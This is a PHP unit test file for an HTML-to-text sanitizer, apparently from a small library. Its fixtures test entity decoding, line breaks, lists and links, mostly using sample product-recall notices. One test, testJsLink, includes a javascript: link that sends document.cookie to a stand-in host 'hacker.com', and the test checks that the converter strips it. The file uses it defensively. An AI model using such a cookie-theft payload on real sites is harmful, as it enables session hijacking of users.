<?php

use OpsRil\Sanitize\Html2Text;

class BasicTest extends \Codeception\Test\Unit
{

    /**
     * @return array
     */
    public function basicDataProvider(): array
    {
        return [
            'Readme usage' => [
                'html' => 'Hello, &quot;<b>world</b>&quot;',
                'expected' => 'Hello, "world"',
            ],
            'No stripslashes on HTML content' => [
                // HTML content does not escape slashes, therefore nor should we.
                'html' => 'Hello, \"<b>world</b>\"',
                'expected' => 'Hello, \"world\"',
            ],
            'Empty b tag in HTML content' => [
                'html' => 'Hello, <b></b>',
                'expected' => 'Hello,',
            ],
            'Zero is not empty' => [
                'html' => '0',
                'expected' => '0',
            ],
            'Paragraph with whitespace wrapping it' => [
                'html' => 'Foo <p>Bar</p> Baz',
                'expected' => "Foo\nBar\nBaz",
            ],
            'Paragraph text with linebreak flat' => [
                'html' => '<p>Foo<br/>Bar</p>',
                'expected' => "Foo\nBar",
            ],
            'Paragraph text with linebreak formatted with newline' => [
                'html' => <<<EOT

<p>
    Foo<br/>
    Bar
</p>
EOT,
                'expected' => "Foo\nBar",
            ],
            'Paragraph text with linebreak formatted with newline, but without whitespace' => [
                'html' => <<<EOT
<p>Foo<br/>
Bar</p>

<p>lall</p>

EOT,
                'expected' => <<<EOT
Foo
Bar

lall
EOT,
            ],
            'Paragraph text with linebreak formatted with indentation' => [
                'html' => <<<EOT

<p>
    Foo<br/>Bar
</p>
lall

EOT,
                'expected' => <<<EOT
Foo
Bar
lall
EOT,

            ],
            '<br /> within <strong>' => [
                'html' => '<strong>Only new<br />line</strong>&nbsp;<strong>is added.</strong>',
                'expected' => "Only new\nline is added.",
            ],
        ];
    }

    // tests

    /**
     * @dataProvider basicDataProvider
     *
     * @param string $html
     * @param string $expected
     * @throws \OpsRil\Sanitize\UncovertedHtmlEntityException
     */
    public function testBasic(string $html, string $expected): void
    {
        $html2Text = new Html2Text();
        static::assertSame($expected, $html2Text->convert($html));
    }

    public function testDel(): void
    {
        $html = 'My <del>Résumé</del> Curriculum Vitæ';
        $expected = 'My Résumé Curriculum Vitæ';
        $html2text = new Html2Text();
        static::assertSame($expected, $html2text->convert($html));
    }

    public function testMultilineHtmlString()
    {
        $html = <<<EOT
<TEXTFORMAT LEADING="2">
    <P ALIGN="LEFT">
        <FONT FACE="Verdana" SIZE="16" COLOR="#0B333C" LETTERSPACING="0" KERNING="0">
            <B>Disposition:</B> Return to Vendor from Distribution
        </FONT>
    </P>
    <br>
    <P ALIGN="LEFT">
        <FONT COLOR="#0B333C">
            <I>Disposition:&nbsp;Remove</I>
        </FONT>
    </P>
</TEXTFORMAT>
<TEXTFORMAT LEADING="2">
    <P ALIGN="LEFT">
        <FONT FACE="Verdana" SIZE="16" COLOR="#0B333C" LETTERSPACING="0" KERNING="0">
            HTML entities: &rsquo; &amp; &Acirc; &reg; &ldquo; &rdquo; &ndash; &bull;
        </FONT>
    </P>
</TEXTFORMAT>
EOT;

        $expected = <<<EOT
Disposition: Return to Vendor from Distribution

Disposition: Remove

HTML entities: ’ & Â ® “ ” – •
EOT;

        $html2text = new Html2Text();
        static::assertSame($expected, $html2text->convert($html));
    }

    public function testNewLines()
    {
        $html = <<<EOT
<p>Between this and</p>
<p>foo&zwnj;bar</p>
<p>this paragraph there should be only one newline</p>
<h1>and this also goes for headings</h1>
<h1 style="color: red;">test</h1>
test
<br>
lall
EOT;
        $expected = <<<EOT
Between this and

foo‌bar

this paragraph there should be only one newline

and this also goes for headings

test

test
lall
EOT;
        $html2text = new Html2Text();
        static::assertSame($expected, $html2text->convert($html));
    }

    public function testEncodings()
    {
        $html = <<<EOT
&amp; &lt; &gt;<br>
&#32; &#33; &#34; &#35; &#36; &#37; &#38; &#39; &#40; &#41; &#42; &#43; &#44; &#45; &#46; &#47; &#48; &#49; &#50; &#51; &#52; &#53; &#54; &#55; &#56; &#57; &#58; &#59; &#60; &#61; &#62; &#63; &#64; &#65; &#66; &#67; &#68; &#69; &#70; &#71; &#72; &#73; &#74; &#75; &#76; &#77; &#78; &#79; &#80; &#81; &#82; &#83; &#84; &#85; &#86; &#87; &#88; &#89; &#90; &#91; &#92; &#93; &#94; &#95; &#96; &#97; &#98; &#99; &#100; &#101; &#102; &#103; &#104; &#105; &#106; &#107; &#108; &#109; &#110; &#111; &#112; &#113; &#114; &#115; &#116; &#117; &#118; &#119; &#120; &#121; &#122; &#123; &#124; &#125; &#126;<br>
&Agrave; &Aacute; &Acirc; &Atilde; &Auml; &Aring; &AElig; &Ccedil; &Egrave; &Eacute; &Ecirc; &Euml; &Igrave; &Iacute; &Icirc; &Iuml; &ETH; &Ntilde; &Ograve; &Oacute; &Ocirc; &Otilde; &Ouml; &Oslash; &Ugrave; &Uacute; &Ucirc; &Uuml; &Yacute; &THORN; &szlig; &agrave; &aacute; &acirc; &atilde; &auml; &aring; &aelig; &ccedil; &egrave; &eacute; &ecirc; &euml; &igrave; &iacute; &icirc; &iuml; &eth; &ntilde; &ograve; &oacute; &ocirc; &otilde; &ouml; &oslash; &ugrave; &uacute; &ucirc; &uuml; &yacute; &thorn; &yuml;<br>
&#192; &#193; &#194; &#195; &#196; &#197; &#198; &#199; &#200; &#201; &#202; &#203; &#204; &#205; &#206; &#207; &#208; &#209; &#210; &#211; &#212; &#213; &#214; &#216; &#217; &#218; &#219; &#220; &#221; &#222; &#223; &#224; &#225; &#226; &#227; &#228; &#229; &#230; &#231; &#232; &#233; &#234; &#235; &#236; &#237; &#238; &#239; &#240; &#241; &#242; &#243; &#244; &#245; &#246; &#248; &#249; &#250; &#251; &#252; &#253; &#254; &#255;<br>
&nbsp; &iexcl; &cent; &pound; &curren; &yen; &brvbar; &sect; &uml; &copy; &ordf; &laquo; &not; &shy; &reg; &macr; &deg; &plusmn; &sup2; &sup3; &acute; &micro; &para; &cedil; &sup1; &ordm; &raquo; &frac14; &frac12; &frac34; &iquest; &times; &divide;<br>
&#160; &#161; &#162; &#163; &#164; &#165; &#166; &#167; &#168; &#169; &#170; &#171; &#172; &#173; &#174; &#175; &#176; &#177; &#178; &#179; &#180; &#181; &#182; &#184; &#185; &#186; &#187; &#188; &#189; &#190; &#191; &#215; &#247;<br>
&forall; &part; &exist; &empty; &nabla; &isin; &notin; &ni; &prod; &sum; &minus; &lowast; &radic; &prop; &infin; &ang; &and; &or; &cap; &cup; &int; &there4; &sim; &cong; &asymp; &ne; &equiv; &le; &ge; &sub; &sup; &nsub; &sube; &supe; &oplus; &otimes; &perp; &sdot;<br>
&#8704; &#8706; &#8707; &#8709; &#8711; &#8712; &#8713; &#8715; &#8719; &#8721; &#8722; &#8727; &#8730; &#8733; &#8734; &#8736; &#8743; &#8744; &#8745; &#8746; &#8747; &#8756; &#8764; &#8773; &#8776; &#8800; &#8801; &#8804; &#8805; &#8834; &#8835; &#8836; &#8838; &#8839; &#8853; &#8855; &#8869; &#8901;<br>
&Alpha; &Beta; &Gamma; &Delta; &Epsilon; &Zeta; &Eta; &Theta; &Iota; &Kappa; &Lambda; &Mu; &Nu; &Xi; &Omicron; &Pi; &Rho; &Sigma; &Tau; &Upsilon; &Phi; &Chi; &Psi; &Omega; &alpha; &beta; &gamma; &delta; &epsilon; &zeta; &eta; &theta; &iota; &kappa; &lambda; &mu; &nu; &xi; &omicron; &pi; &rho; &sigmaf; &sigma; &tau; &upsilon; &phi; &chi; &psi; &omega; &thetasym; &upsih; &piv;<br>
&#913; &#914; &#915; &#916; &#917; &#918; &#919; &#920; &#921; &#922; &#923; &#924; &#925; &#926; &#927; &#928; &#929; &#931; &#932; &#933; &#934; &#935; &#936; &#937; &#945; &#946; &#947; &#948; &#949; &#950; &#951; &#952; &#953; &#954; &#955; &#956; &#957; &#958; &#959; &#960; &#961; &#962; &#963; &#964; &#965; &#966; &#967; &#968; &#969; &#977; &#978; &#982;<br>
&OElig; &oelig; &Scaron; &scaron; &Yuml; &fnof; &circ; &tilde; &ensp; &emsp; &thinsp; &zwnj; &zwj; &lrm; &rlm; &ndash; &mdash; &lsquo; &rsquo; &sbquo; &ldquo; &rdquo; &bdquo; &dagger; &Dagger; &bull; &hellip; &permil; &prime; &Prime; &lsaquo; &rsaquo; &oline; &euro; &trade; &larr; &uarr; &rarr; &darr; &harr; &crarr; &lceil; &rceil; &lfloor; &rfloor; &loz; &spades; &clubs; &hearts; &diams;<br>
&#338; &#339; &#352; &#353; &#376; &#402; &#710; &#732; &#8194; &#8195; &#8201; &#8204; &#8205; &#8206; &#8207; &#8211; &#8212; &#8216; &#8217; &#8218; &#8220; &#8221; &#8222; &#8224; &#8225; &#8226; &#8230; &#8240; &#8242; &#8243; &#8249; &#8250; &#8254; &#8364; &#8482; &#8592; &#8593; &#8594; &#8595; &#8596; &#8629; &#8968; &#8969; &#8970; &#8971; &#9674; &#9824; &#9827; &#9829; &#9830;<br>
EOT;
        $expected = <<<EOT
& < >
! " # $ % & ' ( ) * + , - . / 0 1 2 3 4 5 6 7 8 9 : ; < = > ? @ A B C D E F G H I J K L M N O P Q R S T U V W X Y Z [ \ ] ^ _ ` a b c d e f g h i j k l m n o p q r s t u v w x y z { | } ~
À Á Â Ã Ä Å Æ Ç È É Ê Ë Ì Í Î Ï Ð Ñ Ò Ó Ô Õ Ö Ø Ù Ú Û Ü Ý Þ ß à á â ã ä å æ ç è é ê ë ì í î ï ð ñ ò ó ô õ ö ø ù ú û ü ý þ ÿ
À Á Â Ã Ä Å Æ Ç È É Ê Ë Ì Í Î Ï Ð Ñ Ò Ó Ô Õ Ö Ø Ù Ú Û Ü Ý Þ ß à á â ã ä å æ ç è é ê ë ì í î ï ð ñ ò ó ô õ ö ø ù ú û ü ý þ ÿ
  ¡ ¢ £ ¤ ¥ ¦ § ¨ © ª « ¬ ­ ® ¯ ° ± ² ³ ´ µ ¶ ¸ ¹ º » ¼ ½ ¾ ¿ × ÷
  ¡ ¢ £ ¤ ¥ ¦ § ¨ © ª « ¬ ­ ® ¯ ° ± ² ³ ´ µ ¶ ¸ ¹ º » ¼ ½ ¾ ¿ × ÷
∀ ∂ ∃ ∅ ∇ ∈ ∉ ∋ ∏ ∑ − ∗ √ ∝ ∞ ∠ ∧ ∨ ∩ ∪ ∫ ∴ ∼ ≅ ≈ ≠ ≡ ≤ ≥ ⊂ ⊃ ⊄ ⊆ ⊇ ⊕ ⊗ ⊥ ⋅
∀ ∂ ∃ ∅ ∇ ∈ ∉ ∋ ∏ ∑ − ∗ √ ∝ ∞ ∠ ∧ ∨ ∩ ∪ ∫ ∴ ∼ ≅ ≈ ≠ ≡ ≤ ≥ ⊂ ⊃ ⊄ ⊆ ⊇ ⊕ ⊗ ⊥ ⋅
Α Β Γ Δ Ε Ζ Η Θ Ι Κ Λ Μ Ν Ξ Ο Π Ρ Σ Τ Υ Φ Χ Ψ Ω α β γ δ ε ζ η θ ι κ λ μ ν ξ ο π ρ ς σ τ υ φ χ ψ ω ϑ ϒ ϖ
Α Β Γ Δ Ε Ζ Η Θ Ι Κ Λ Μ Ν Ξ Ο Π Ρ Σ Τ Υ Φ Χ Ψ Ω α β γ δ ε ζ η θ ι κ λ μ ν ξ ο π ρ ς σ τ υ φ χ ψ ω ϑ ϒ ϖ
Œ œ Š š Ÿ ƒ ˆ ˜       ‌ ‍ ‎ ‏ – — ‘ ’ ‚ “ ” „ † ‡ • … ‰ ′ ″ ‹ › ‾ € ™ ← ↑ → ↓ ↔ ↵ ⌈ ⌉ ⌊ ⌋ ◊ ♠ ♣ ♥ ♦
Œ œ Š š Ÿ ƒ ˆ ˜       ‌ ‍ ‎ ‏ – — ‘ ’ ‚ “ ” „ † ‡ • … ‰ ′ ″ ‹ › ‾ € ™ ← ↑ → ↓ ↔ ↵ ⌈ ⌉ ⌊ ⌋ ◊ ♠ ♣ ♥ ♦
EOT;
        $html2text = new Html2Text();
        static::assertSame($expected, $html2text->convert($html));
    }

    public function testNumericHexCharacterReferences()
    {
        $html = <<<EOT
&#x21; &#x22; &#x23; &#x24; &#x25; &#x26; &#x27; &#x28; &#x29; &#x2a; &#x2b; &#x2c; &#x2d; &#x2e; &#x2f; &#x30; &#x31; &#x32; &#x33; &#x34; &#x35; &#x36; &#x37; &#x38; &#x39; &#x3a; &#x3b; &#x3c; &#x3d; &#x3e; &#x3f; &#x40; &#x41; &#x42; &#x43; &#x44; &#x45; &#x46; &#x47; &#x48; &#x49; &#x4a; &#x4b; &#x4c; &#x4d; &#x4e; &#x4f; &#x50; &#x51; &#x52; &#x53; &#x54; &#x55; &#x56; &#x57; &#x58; &#x59; &#x5a; &#x5b; &#x5c; &#x5d; &#x5e; &#x5f; &#x60; &#x61; &#x62; &#x63; &#x64; &#x65; &#x66; &#x67; &#x68; &#x69; &#x6a; &#x6b; &#x6c; &#x6d; &#x6e; &#x6f; &#x70; &#x71; &#x72; &#x73; &#x74; &#x75; &#x76; &#x77; &#x78; &#x79; &#x7a; &#x7b; &#x7c; &#x7d; &#x7e;<br>
&#x192; &#x391; &#x392; &#x393; &#x394; &#x395; &#x396; &#x397; &#x398; &#x399; &#x39A; &#x39B; &#x39C; &#x39D; &#x39E; &#x39F; &#x3A0; &#x3A1; &#x3A3; &#x3A4; &#x3A5; &#x3A6; &#x3A7; &#x3A8; &#x3A9; &#x3B1; &#x3B2; &#x3B3; &#x3B4; &#x3B5; &#x3B6; &#x3B7; &#x3B8; &#x3B9; &#x3BA; &#x3BB; &#x3BC; &#x3BD; &#x3BE; &#x3BF; &#x3C0; &#x3C1; &#x3C2; &#x3C3; &#x3C4; &#x3C5; &#x3C6; &#x3C7; &#x3C8; &#x3C9; &#x3D1; &#x3D2; &#x3D6; &#x2022; &#x2026; &#x2032; &#x2033; &#x203E; &#x2044; &#x2118; &#x2111; &#x211C; &#x2122; &#x2135; &#x2190; &#x2191; &#x2192; &#x2193; &#x2194; &#x21B5; &#x21D0; &#x21D1; &#x21D2; &#x21D3; &#x21D4; &#x2200; &#x2202; &#x2203; &#x2205; &#x2207; &#x2208; &#x2209; &#x220B; &#x220F; &#x2211; &#x2212; &#x2217; &#x221A; &#x221D; &#x221E; &#x2220; &#x2227; &#x2228; &#x2229; &#x222A; &#x222B; &#x2234; &#x223C; &#x2245; &#x2248; &#x2260; &#x2261; &#x2264; &#x2265; &#x2282; &#x2283; &#x2284; &#x2286; &#x2287; &#x2295; &#x2297; &#x22A5; &#x22C5; &#x2308; &#x2309; &#x230A; &#x230B; &#x2329; &#x232A; &#x25CA; &#x2660; &#x2663; &#x2665; &#x2666;
EOT;
        $expected = <<<EOT
! " # $ % & ' ( ) * + , - . / 0 1 2 3 4 5 6 7 8 9 : ; < = > ? @ A B C D E F G H I J K L M N O P Q R S T U V W X Y Z [ \\ ] ^ _ ` a b c d e f g h i j k l m n o p q r s t u v w x y z { | } ~
ƒ Α Β Γ Δ Ε Ζ Η Θ Ι Κ Λ Μ Ν Ξ Ο Π Ρ Σ Τ Υ Φ Χ Ψ Ω α β γ δ ε ζ η θ ι κ λ μ ν ξ ο π ρ ς σ τ υ φ χ ψ ω ϑ ϒ ϖ • … ′ ″ ‾ ⁄ ℘ ℑ ℜ ™ ℵ ← ↑ → ↓ ↔ ↵ ⇐ ⇑ ⇒ ⇓ ⇔ ∀ ∂ ∃ ∅ ∇ ∈ ∉ ∋ ∏ ∑ − ∗ √ ∝ ∞ ∠ ∧ ∨ ∩ ∪ ∫ ∴ ∼ ≅ ≈ ≠ ≡ ≤ ≥ ⊂ ⊃ ⊄ ⊆ ⊇ ⊕ ⊗ ⊥ ⋅ ⌈ ⌉ ⌊ ⌋ 〈 〉 ◊ ♠ ♣ ♥ ♦
EOT;
        $html2text = new Html2Text();
        static::assertSame($expected, $html2text->convert($html));
    }

    public function testMailtoLink()
    {
        $html = <<<EOT
<p>
  <strong style="color: rgb(51, 51, 51)">Disposition:</strong
  ><span style="color: rgb(51, 51, 51)">&nbsp;Destroy at Store Level</span
  ><span style="color: rgb(230, 0, 0)">&nbsp;</span>
</p>
<p>
  <strong style="color: rgb(51, 51, 51)"
    >Any product that is pulled must have the name of the Responsible Party and
    a separate Witness noted</strong
  >
</p>
<p>
  <strong style="color: rgb(51, 51, 51)">Contact Info:</strong>
  Peek Rogurt, Toni Tester, VP Sales,
  <a
    href="mailto:toni.tester@example.com"
    rel="noopener noreferrer"
    target="_blank"
    >Send Email</a
  >, 555-111-1111
</p>
EOT;
        $expected = <<<EOT
Disposition: Destroy at Store Level 

Any product that is pulled must have the name of the Responsible Party and a separate Witness noted

Contact Info: Peek Rogurt, Toni Tester, VP Sales, toni.tester@example.com, 555-111-1111
EOT;
        $html2text = new Html2Text();
        static::assertSame($expected, $html2text->convert($html));
    }

    public function testJsLink()
    {
        $html = <<<EOT
<a href="javascript:window.open('http://hacker.com?cookie='+document.cookie);">Link text</a>
EOT;
        $expected = 'Link text';
        $html2text = new Html2Text();
        static::assertSame($expected, $html2text->convert($html));
    }

    public function testLiTag()
    {
        $html = <<<EOT
<p>
  <strong style="color: rgb(51, 51, 51)">Disposition:</strong
  ><span style="color: rgb(51, 51, 51)">&nbsp;</span>
</p>
<ul>
  <li>
    <strong>Locate</strong>&nbsp;all impacted product in the front and back of
    house
  </li>
  <li>Immediately&nbsp;<strong>dispose</strong>&nbsp;of the product</li>
  <li>
    <strong>Do not request credit</strong> for discarded product on The
    Coffee Company or through your LSR. Coffee Company will issue credits based on
    the amount of impacted product shipped to your store by April 1, as shown on
    the store list.
  </li>
  <li>
    <strong>Check all incoming orders carefully</strong> for the impacted items;
    if you receive additional impacted product follow the steps above to discard
  </li>
  <li><strong>Do not sell, donate or give away any of this product</strong></li>
  <li>Reorder additional inventory as needed</li>
</ul>
<p>
  <strong style="color: rgb(51, 51, 51)"
    >Any product that is pulled must have the name of the Responsible Party and
    a separate Witness noted.
  </strong>
</p>
<p>
  <strong style="color: rgb(51, 51, 51)">Contact Info:</strong>
  <strong style="color: rgb(51, 51, 51)">Contact Info: </strong
  ><span style="color: rgb(51, 51, 51)"
    >Coffee Company, Tonia</span
  >
  <span style="color: rgb(51, 51, 51)"
    >Tester, Sr. Operations Consultation Manager, ttester@example.com,
    555-111-1111</span
  >
</p>
EOT;
        $expected = <<<EOT
Disposition: 

\t* Locate all impacted product in the front and back of house
\t* Immediately dispose of the product
\t* Do not request credit for discarded product on The Coffee Company or through your LSR. Coffee Company will issue credits based on the amount of impacted product shipped to your store by April 1, as shown on the store list.
\t* Check all incoming orders carefully for the impacted items; if you receive additional impacted product follow the steps above to discard
\t* Do not sell, donate or give away any of this product
\t* Reorder additional inventory as needed

Any product that is pulled must have the name of the Responsible Party and a separate Witness noted.

Contact Info: Contact Info: Coffee Company, Tonia Tester, Sr. Operations Consultation Manager, ttester@example.com, 555-111-1111
EOT;
        $html2text = new Html2Text();
        static::assertSame($expected, $html2text->convert($html));
    }

    public function testRegularLink()
    {
        $html = <<<EOT
<p>
  <strong style="color: rgb(230, 0, 0)"
    >Please make sure you enter your information for the 5 items listed in the
    recall in Recall Infolink. Check the surrounding areas/products for any
    signs of bugs. If you find additional items with bugs, please scan your
    product out as recall and destroy the product. Please&nbsp;enter any of the
    additional product you find with bugs into the Google spreadsheet, drive
    link here: </strong
  ><a
    href="https://example.com/download/file/d/1knF5cG?usp=sharing"
    rel="noopener noreferrer"
    target="_blank"
    >https://example.com/download</a
  >
</p>
<p>
  <strong>Disposition:</strong> Scan out as Recall Reclamation and Destroy at
  Store level
</p>
<p>
  <strong
    >Any product that is pulled must have the name of the Responsible Party and
    a separate Witness noted</strong
  >
</p>
<p>
  <strong>Contact Info:</strong> Tonia Tester, 555-111-1111 or Toni Tester,
  555-111-2222
</p>
EOT;

        $expected = <<<EOT
Please make sure you enter your information for the 5 items listed in the recall in Recall Infolink. Check the surrounding areas/products for any signs of bugs. If you find additional items with bugs, please scan your product out as recall and destroy the product. Please enter any of the additional product you find with bugs into the Google spreadsheet, drive link here: https://example.com/download [https://example.com/download/file/d/1knF5cG?usp=sharing]

Disposition: Scan out as Recall Reclamation and Destroy at Store level

Any product that is pulled must have the name of the Responsible Party and a separate Witness noted

Contact Info: Tonia Tester, 555-111-1111 or Toni Tester, 555-111-2222
EOT;
        $html2text = new Html2Text();
        static::assertSame($expected, $html2text->convert($html));
    }

    public function testEm()
    {
        $html = <<<EOT
<p>
  <strong style="color: rgb(230, 0, 0)"
    >NOTE: <u>ONLY PULL MASTERCASES</u> from backroom and or freezers with the
    affected Lot Code and Use By date.
    <em
      ><u
        >DO NOT pull items that have already been made and labeled for sale.</u
      ></em
    >
    See Images for reference.</strong
  >
</p>
<p><strong>Disposition:</strong> Destroy at Store Level</p>
<p>
  <strong
    >Any product that is pulled must have the name of the Responsible Party and
    a separate Witness noted</strong
  >
</p>
<p>
  <strong>Supplier Contact Info:</strong> Toni Tester Corporation, Tonia
  Tester, Director Sales, ttester@example.com, 555-111-1111
</p>
EOT;
        $expected = <<<EOT
NOTE: ONLY PULL MASTERCASES from backroom and or freezers with the affected Lot Code and Use By date. DO NOT pull items that have already been made and labeled for sale. See Images for reference.

Disposition: Destroy at Store Level

Any product that is pulled must have the name of the Responsible Party and a separate Witness noted

Supplier Contact Info: Toni Tester Corporation, Tonia Tester, Director Sales, ttester@example.com, 555-111-1111
EOT;

        $html2text = new Html2Text();
        static::assertSame($expected, $html2text->convert($html));
    }

    public function testNbsp()
    {
        $html = <<<EOT
<p>&nbsp;Non-breaking spaces<br>&nbsp;at start<br>and end &nbsp;</p>
EOT;
        $expected = <<<EOT
 Non-breaking spaces
 at start
and end  
EOT;

        $html2text = new Html2Text();
        static::assertSame($expected, $html2text->convert($html));
    }
}
